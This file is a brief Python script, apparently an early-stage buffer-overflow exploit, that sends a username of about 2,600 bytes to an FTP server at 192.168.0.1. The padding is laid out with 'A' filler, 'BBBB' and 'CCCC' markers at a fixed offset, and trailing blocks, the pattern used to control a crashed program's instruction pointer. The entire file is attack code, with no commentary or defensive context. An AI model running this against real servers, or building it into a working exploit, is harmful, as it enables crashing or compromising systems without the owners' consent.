import ftplib

buffer="A" * 2004
buffer +="BBBB"
buffer +="CCCC"
buffer +="E" * 200
buffer +="F" * 200
buffer +="G" * 200

ftp = ftplib.FTP('192.168.0.1', buffer, 'test')
